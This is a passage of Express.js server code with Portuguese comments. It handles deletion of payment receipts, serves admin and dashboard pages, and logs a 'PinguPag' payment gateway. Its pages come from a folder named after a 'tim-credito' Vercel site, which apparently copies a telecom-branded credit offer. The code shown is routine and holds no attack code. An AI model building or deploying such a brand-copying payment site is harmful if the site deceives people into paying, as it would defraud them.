            const cType = matches[1];
            const buffer = Buffer.from(matches[2], 'base64');
            res.setHeader('Content-Type', cType);
            res.setHeader('Content-Length', buffer.length);
            return res.send(buffer);
        }
    }

    res.status(404).send('Arquivo nao disponivel fisicamente');
});

// Exclusão de comprovante
app.delete('/api/admin/comprovantes/:id', adminAuth, (req, res) => {
    let comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    if (record.fileName) {
        try { fs.unlinkSync(path.join(uploadsDir, record.fileName)); } catch(e) {}
    }
    comprovantes = comprovantes.filter(c => c.id !== req.params.id);
    saveComprovantes(comprovantes);
    res.json({ success: true });
});

// Admin pages
const adminDir = path.resolve(__dirname, 'tim-credito.vercel.app', 'admin');
const publicDir = path.resolve(__dirname, 'tim-credito.vercel.app');

app.get('/admin', (req, res) => {
    res.sendFile('index.html', { root: adminDir }, (err) => {
        if (err && !res.headersSent) res.status(404).send('Página admin não encontrada');
    });
});

app.get('/admin/dashboard', (req, res) => {
    res.sendFile('dashboard.html', { root: adminDir }, (err) => {
        if (err && !res.headersSent) res.status(404).send('Dashboard não encontrado');
    });
});

// Fallback to index.html
app.use((req, res) => {
    res.sendFile('index.html', { root: publicDir }, (err) => {
        if (err && !res.headersSent) res.status(404).send('Not Found');
    });
});

if (!isVercel) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Gateway ativo: ${activeGateway.toUpperCase()} (Padrão: PinguPag)`);
        console.log(`Acesse: http://localhost:${PORT}`);
        console.log(`Admin:  http://localhost:${PORT}/admin`);
    });
}

module.exports = app;
